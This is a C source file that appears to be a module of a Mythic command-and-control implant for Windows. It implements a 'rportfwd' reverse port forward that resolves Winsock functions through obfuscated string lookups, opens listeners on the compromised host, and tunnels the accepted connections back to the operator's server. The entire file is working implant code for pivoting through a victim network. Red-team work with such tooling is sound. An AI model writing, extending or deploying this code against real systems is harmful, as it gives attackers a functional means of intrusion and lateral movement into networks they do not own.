#include "config.h"
#ifdef INCLUDE_RPFWD

#include "rpfwd.h"
#include "commands.h"
#include "parser.h"
#include "package.h"

// -- Winsock API resolution (independent from SOCKS; WSAStartup is idempotent) --

static BOOL _resolve_winsock(PINSTANCE inst, PRPFWD_CTX ctx) {
    xstr(_ws2, "ws2_32.dll");
    ctx->hWs2_32 = inst->Win32.LoadLibraryA(_ws2);
    if (!ctx->hWs2_32) return FALSE;

    HMODULE h = (HMODULE)ctx->hWs2_32;

    ctx->pWSAStartup      = (fnWSAStartup)inst->Win32.GetProcAddress(h, XSTR("WSAStartup"));
    ctx->pWSACleanup      = (fnWSACleanup)inst->Win32.GetProcAddress(h, XSTR("WSACleanup"));
    ctx->pSocket          = (fn_ws_socket)inst->Win32.GetProcAddress(h, XSTR("socket"));
    ctx->pBind            = (fn_ws_bind)inst->Win32.GetProcAddress(h, XSTR("bind"));
    ctx->pListen          = (fn_ws_listen)inst->Win32.GetProcAddress(h, XSTR("listen"));
    ctx->pAccept          = (fn_ws_accept)inst->Win32.GetProcAddress(h, XSTR("accept"));
    ctx->pSetsockopt      = (fn_ws_setsockopt)inst->Win32.GetProcAddress(h, XSTR("setsockopt"));
    ctx->pSend            = (fn_ws_send)inst->Win32.GetProcAddress(h, XSTR("send"));
    ctx->pRecv            = (fn_ws_recv)inst->Win32.GetProcAddress(h, XSTR("recv"));
    ctx->pClosesocket     = (fn_ws_closesocket)inst->Win32.GetProcAddress(h, XSTR("closesocket"));
    ctx->pSelect          = (fn_ws_select)inst->Win32.GetProcAddress(h, XSTR("select"));
    ctx->pIoctlsocket     = (fn_ws_ioctlsocket)inst->Win32.GetProcAddress(h, XSTR("ioctlsocket"));
    ctx->pHtons           = (fn_ws_htons)inst->Win32.GetProcAddress(h, XSTR("htons"));
    ctx->pHtonl           = (fn_ws_htonl)inst->Win32.GetProcAddress(h, XSTR("htonl"));
    ctx->pNtohs           = (fn_ws_ntohs)inst->Win32.GetProcAddress(h, XSTR("ntohs"));
    ctx->pWSAGetLastError = (fn_ws_WSAGetLastError)inst->Win32.GetProcAddress(h, XSTR("WSAGetLastError"));

    if (!ctx->pWSAStartup || !ctx->pSocket || !ctx->pBind ||
        !ctx->pListen || !ctx->pAccept || !ctx->pSend ||
        !ctx->pRecv || !ctx->pClosesocket || !ctx->pSelect ||
        !ctx->pIoctlsocket || !ctx->pHtons)
        return FALSE;

    return TRUE;
}

// -- Upstream queue helpers --

static VOID _queue_upstream(PINSTANCE inst, PRPFWD_CTX ctx,
                            DWORD server_id, const BYTE* data, DWORD data_len, BOOL is_exit) {
    if (ctx->upstream_count >= RPFWD_MAX_UPSTREAM) {
        // Drop oldest to make room
        if (ctx->upstream[0].data) es_free(inst, ctx->upstream[0].data);
        for (DWORD i = 1; i < ctx->upstream_count; i++)
            ctx->upstream[i - 1] = ctx->upstream[i];
        ctx->upstream_count--;
    }
    RPFWD_UPSTREAM* u = &ctx->upstream[ctx->upstream_count];
    u->server_id = server_id;
    u->is_exit   = is_exit;
    if (data && data_len > 0) {
        u->data = (BYTE*)es_malloc(inst, data_len);
        if (u->data) {
            es_memcpy(u->data, (PVOID)data, data_len);
            u->data_len = data_len;
        } else {
            u->data_len = 0;
        }
    } else {
        u->data = NULL;
        u->data_len = 0;
    }
    ctx->upstream_count++;
}

// -- Connection table helpers --

static RPFWD_CONN* _find_conn(PRPFWD_CTX ctx, DWORD server_id) {
    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state != RPFWD_STATE_FREE && ctx->conns[i].server_id == server_id)
            return &ctx->conns[i];
    }
    return NULL;
}

static RPFWD_CONN* _alloc_conn(PRPFWD_CTX ctx) {
    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state == RPFWD_STATE_FREE)
            return &ctx->conns[i];
    }
    return NULL;
}

static VOID _close_conn(PRPFWD_CTX ctx, RPFWD_CONN* conn) {
    if (conn->sock != WS_INVALID_SOCKET && ctx->pClosesocket)
        ctx->pClosesocket(conn->sock);
    conn->sock       = WS_INVALID_SOCKET;
    conn->server_id  = 0;
    conn->state      = RPFWD_STATE_FREE;
    conn->bound_port = 0;
}

// -- Listener helpers --

static RPFWD_LISTENER* _find_listener(PRPFWD_CTX ctx, WORD port) {
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        if (ctx->listeners[i].active && ctx->listeners[i].port == port)
            return &ctx->listeners[i];
    }
    return NULL;
}

static RPFWD_LISTENER* _alloc_listener(PRPFWD_CTX ctx) {
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        if (!ctx->listeners[i].active)
            return &ctx->listeners[i];
    }
    return NULL;
}

static VOID _close_listener(PRPFWD_CTX ctx, RPFWD_LISTENER* lsn) {
    if (lsn->sock != WS_INVALID_SOCKET && ctx->pClosesocket)
        ctx->pClosesocket(lsn->sock);
    lsn->sock   = WS_INVALID_SOCKET;
    lsn->port   = 0;
    lsn->active = FALSE;
}

// -- Simple PRNG for server_id generation (no need for crypto quality) --
static DWORD _next_server_id(void) {
    // Use a static counter XOR'd with a shifting value for uniqueness
    static DWORD s_counter = 0x41424344;
    s_counter = s_counter * 1103515245 + 12345;
    return s_counter;
}

// -- Public API --

BOOL rpfwd_init(PINSTANCE inst) {
    if (inst->pRpfwdCtx) return TRUE; // already initialized

    PRPFWD_CTX ctx = (PRPFWD_CTX)es_malloc(inst, sizeof(RPFWD_CTX));
    if (!ctx) return FALSE;

    es_memset(ctx, 0, sizeof(RPFWD_CTX));
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        ctx->listeners[i].sock   = WS_INVALID_SOCKET;
        ctx->listeners[i].active = FALSE;
    }
    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        ctx->conns[i].sock  = WS_INVALID_SOCKET;
        ctx->conns[i].state = RPFWD_STATE_FREE;
    }

    if (!_resolve_winsock(inst, ctx)) {
        es_free(inst, ctx);
        return FALSE;
    }

    // WSAStartup is ref-counted and idempotent; safe to call even if SOCKS
    // already called it in the same process
    WS_WSADATA wsa;
    es_memset(&wsa, 0, sizeof(wsa));
    if (ctx->pWSAStartup(WS_MAKEWORD(2, 2), &wsa) != 0) {
        es_free(inst, ctx);
        return FALSE;
    }
    ctx->wsa_up = TRUE;

    inst->pRpfwdCtx = ctx;
    return TRUE;
}

BOOL rpfwd_start(PINSTANCE inst, WORD port) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return FALSE;

    // Check if already listening on this port
    if (_find_listener(ctx, port)) return TRUE;

    RPFWD_LISTENER* lsn = _alloc_listener(ctx);
    if (!lsn) return FALSE;

    // Create TCP socket
    UINT_PTR sock = ctx->pSocket(WS_AF_INET, WS_SOCK_STREAM, WS_IPPROTO_TCP);
    if (sock == WS_INVALID_SOCKET) return FALSE;

    // SO_REUSEADDR: allow quick rebind after stop
    if (ctx->pSetsockopt) {
        int reuse = 1;
        ctx->pSetsockopt(sock, WS_SOL_SOCKET, WS_SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
    }

    // Bind to 0.0.0.0:<port>
    WS_SOCKADDR_IN sa;
    es_memset(&sa, 0, sizeof(sa));
    sa.sin_family = WS_AF_INET;
    sa.sin_port   = ctx->pHtons(port);
    sa.sin_addr   = 0; // INADDR_ANY

    if (ctx->pBind(sock, (const WS_SOCKADDR*)&sa, sizeof(sa)) != 0) {
        ctx->pClosesocket(sock);
        return FALSE;
    }

    // Listen with a small backlog
    if (ctx->pListen(sock, 5) != 0) {
        ctx->pClosesocket(sock);
        return FALSE;
    }

    // Set non-blocking so accept() doesn't stall the main loop
    unsigned long nb_mode = 1;
    ctx->pIoctlsocket(sock, WS_FIONBIO, &nb_mode);

    lsn->sock   = sock;
    lsn->port   = port;
    lsn->active = TRUE;

    return TRUE;
}

VOID rpfwd_stop(PINSTANCE inst, WORD port) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return;

    // Close matching connections and queue exit notifications
    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state == RPFWD_STATE_FREE) continue;
        if (port == 0 || ctx->conns[i].bound_port == port) {
            DWORD sid = ctx->conns[i].server_id;
            _close_conn(ctx, &ctx->conns[i]);
            _queue_upstream(inst, ctx, sid, NULL, 0, TRUE);
        }
    }

    // Close matching listeners
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        if (!ctx->listeners[i].active) continue;
        if (port == 0 || ctx->listeners[i].port == port)
            _close_listener(ctx, &ctx->listeners[i]);
    }
}

VOID rpfwd_poll(PINSTANCE inst) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return;

    // -- Accept new connections on all active listeners --
    for (int li = 0; li < RPFWD_MAX_LISTENERS; li++) {
        if (!ctx->listeners[li].active) continue;

        // Non-blocking accept loop: drain all pending connections
        for (;;) {
            WS_SOCKADDR_IN client_addr;
            int addr_len = sizeof(client_addr);
            UINT_PTR client_sock = ctx->pAccept(ctx->listeners[li].sock,
                                                (WS_SOCKADDR*)&client_addr, &addr_len);
            if (client_sock == WS_INVALID_SOCKET) break; // no more pending

            RPFWD_CONN* conn = _alloc_conn(ctx);
            if (!conn) {
                // No free slots; refuse the connection
                ctx->pClosesocket(client_sock);
                break;
            }

            // Set non-blocking on accepted socket
            unsigned long nb = 1;
            ctx->pIoctlsocket(client_sock, WS_FIONBIO, &nb);

            DWORD sid = _next_server_id();
            conn->server_id  = sid;
            conn->sock       = client_sock;
            conn->state      = RPFWD_STATE_CONNECTED;
            conn->bound_port = ctx->listeners[li].port;

            // Notify Mythic about the new connection (empty data, not exit)
            // Mythic uses the first upstream message with a new server_id as
            // the "new connection" signal for rpfwd
            _queue_upstream(inst, ctx, sid, NULL, 0, FALSE);
        }
    }

    // -- Non-blocking recv on all active connections --
    WS_FD_SET rfds;
    es_memset(&rfds, 0, sizeof(rfds));

    int conn_indices[RPFWD_MAX_CONNS];
    int active_count = 0;

    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state == RPFWD_STATE_CONNECTED && active_count < 64) {
            rfds.fd_array[active_count] = ctx->conns[i].sock;
            conn_indices[active_count]  = i;
            active_count++;
        }
    }

    if (active_count == 0) return;
    rfds.fd_count = (UINT)active_count;

    WS_TIMEVAL tv;
    tv.tv_sec  = 0;
    tv.tv_usec = 0;

    int sel = ctx->pSelect(0, &rfds, NULL, NULL, &tv);
    if (sel <= 0) return;

    for (int j = 0; j < active_count; j++) {
        UINT_PTR sock = ctx->conns[conn_indices[j]].sock;
        BOOL readable = FALSE;
        for (UINT k = 0; k < rfds.fd_count; k++) {
            if (rfds.fd_array[k] == sock) { readable = TRUE; break; }
        }
        if (!readable) continue;

        RPFWD_CONN* conn = &ctx->conns[conn_indices[j]];
        int r = ctx->pRecv(conn->sock, (char*)ctx->recv_buf, RPFWD_RECV_BUF_SIZE, 0);
        if (r > 0) {
            _queue_upstream(inst, ctx, conn->server_id, ctx->recv_buf, (DWORD)r, FALSE);
        } else {
            // Connection closed or error
            DWORD sid = conn->server_id;
            _close_conn(ctx, conn);
            _queue_upstream(inst, ctx, sid, NULL, 0, TRUE);
        }
    }
}

VOID rpfwd_handle_downstream(PINSTANCE inst, const BYTE* buf, DWORD buf_len) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return;

    // Wire format: [count: 4B BE] per entry: [server_id: 4B BE] [exit: 1B] [data_len: 4B BE] [data: var]
    if (buf_len < 4) return;
    DWORD count = ((DWORD)buf[0] << 24) | ((DWORD)buf[1] << 16) |
                  ((DWORD)buf[2] << 8)  | buf[3];
    DWORD pos = 4;

    for (DWORD i = 0; i < count; i++) {
        if (pos + 9 > buf_len) break;

        DWORD server_id = ((DWORD)buf[pos] << 24) | ((DWORD)buf[pos+1] << 16) |
                          ((DWORD)buf[pos+2] << 8) | buf[pos+3];
        pos += 4;

        BYTE is_exit = buf[pos++];

        DWORD data_len = ((DWORD)buf[pos] << 24) | ((DWORD)buf[pos+1] << 16) |
                         ((DWORD)buf[pos+2] << 8) | buf[pos+3];
        pos += 4;

        if (pos + data_len > buf_len) break;
        const BYTE* data = buf + pos;
        pos += data_len;

        // Exit: close the connection
        if (is_exit) {
            RPFWD_CONN* conn = _find_conn(ctx, server_id);
            if (conn) _close_conn(ctx, conn);
            continue;
        }

        // Find existing connection and relay data to target socket
        RPFWD_CONN* conn = _find_conn(ctx, server_id);
        if (conn && data_len > 0 && conn->state == RPFWD_STATE_CONNECTED) {
            DWORD sent = 0;
            while (sent < data_len) {
                int r = ctx->pSend(conn->sock, (const char*)(data + sent),
                                   (int)(data_len - sent), 0);
                if (r <= 0) {
                    // Send failed: close and notify
                    DWORD sid = conn->server_id;
                    _close_conn(ctx, conn);
                    _queue_upstream(inst, ctx, sid, NULL, 0, TRUE);
                    break;
                }
                sent += (DWORD)r;
            }
        }
        // Unknown server_id with data but no exit: drop silently.
        // Unlike SOCKS, rpfwd connections are established agent-side via accept(),
        // so a downstream message for a missing server_id is a stale reference.
    }
}

BYTE* rpfwd_build_upstream(PINSTANCE inst, DWORD* out_len) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx || ctx->upstream_count == 0) {
        *out_len = 0;
        return NULL;
    }

    // Calculate total size: header count(4) + per entry: server_id(4) + exit(1) + data_len(4) + data(var)
    DWORD total = 4;
    for (DWORD i = 0; i < ctx->upstream_count; i++)
        total += 4 + 1 + 4 + ctx->upstream[i].data_len;

    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) { *out_len = 0; return NULL; }

    DWORD pos = 0;
    DWORD count = ctx->upstream_count;
    buf[pos++] = (count >> 24) & 0xFF;
    buf[pos++] = (count >> 16) & 0xFF;
    buf[pos++] = (count >> 8)  & 0xFF;
    buf[pos++] = count & 0xFF;

    for (DWORD i = 0; i < count; i++) {
        RPFWD_UPSTREAM* u = &ctx->upstream[i];

        buf[pos++] = (u->server_id >> 24) & 0xFF;
        buf[pos++] = (u->server_id >> 16) & 0xFF;
        buf[pos++] = (u->server_id >> 8)  & 0xFF;
        buf[pos++] = u->server_id & 0xFF;

        buf[pos++] = u->is_exit ? 1 : 0;

        DWORD dl = u->data_len;
        buf[pos++] = (dl >> 24) & 0xFF;
        buf[pos++] = (dl >> 16) & 0xFF;
        buf[pos++] = (dl >> 8)  & 0xFF;
        buf[pos++] = dl & 0xFF;

        if (u->data && dl > 0) {
            es_memcpy(buf + pos, u->data, dl);
            pos += dl;
        }

        if (u->data) es_free(inst, u->data);
    }

    ctx->upstream_count = 0;
    *out_len = pos;
    return buf;
}

BOOL rpfwd_has_active(PINSTANCE inst) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return FALSE;

    // Check listeners
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        if (ctx->listeners[i].active) return TRUE;
    }
    // Check connections
    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state != RPFWD_STATE_FREE) return TRUE;
    }
    return FALSE;
}

VOID rpfwd_teardown(PINSTANCE inst) {
    PRPFWD_CTX ctx = (PRPFWD_CTX)inst->pRpfwdCtx;
    if (!ctx) return;

    for (int i = 0; i < RPFWD_MAX_CONNS; i++) {
        if (ctx->conns[i].state != RPFWD_STATE_FREE)
            _close_conn(ctx, &ctx->conns[i]);
    }
    for (int i = 0; i < RPFWD_MAX_LISTENERS; i++) {
        if (ctx->listeners[i].active)
            _close_listener(ctx, &ctx->listeners[i]);
    }

    for (DWORD i = 0; i < ctx->upstream_count; i++) {
        if (ctx->upstream[i].data)
            es_free(inst, ctx->upstream[i].data);
    }
    ctx->upstream_count = 0;
}

VOID cmd_rportfwd(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD action_len = 0;
    char* action = parser_string(args, &action_len);
    if (!action || action_len == 0) {
        package_add_string(inst, response, XSTR("Usage: rportfwd <start|stop> <port>"));
        response->is_error = TRUE;
        return;
    }

    // Parse port (second parameter, int32 big-endian)
    DWORD port_val = parser_int32(args);
    WORD port = (WORD)(port_val & 0xFFFF);

    BOOL is_start = (action_len >= 5 && action[0] == 's' && action[1] == 't' &&
                     action[2] == 'a' && action[3] == 'r' && action[4] == 't');
    BOOL is_stop  = (action_len >= 4 && action[0] == 's' && action[1] == 't' &&
                     action[2] == 'o' && action[3] == 'p');

    if (is_start) {
        if (port == 0) {
            package_add_string(inst, response, XSTR("Port must be non-zero"));
            response->is_error = TRUE;
            return;
        }
        if (!rpfwd_init(inst)) {
            package_add_string(inst, response, XSTR("Failed to initialize Winsock for rpfwd"));
            response->is_error = TRUE;
            return;
        }
        if (!rpfwd_start(inst, port)) {
            package_add_string(inst, response, XSTR("Failed to bind listening port"));
            response->is_error = TRUE;
            return;
        }
        package_add_string(inst, response, XSTR("Reverse port forward started"));
    } else if (is_stop) {
        rpfwd_stop(inst, port);
        package_add_string(inst, response, XSTR("Reverse port forward stopped"));
    } else {
        package_add_string(inst, response, XSTR("Unknown action. Use start or stop."));
        response->is_error = TRUE;
    }
}

#endif // INCLUDE_RPFWD
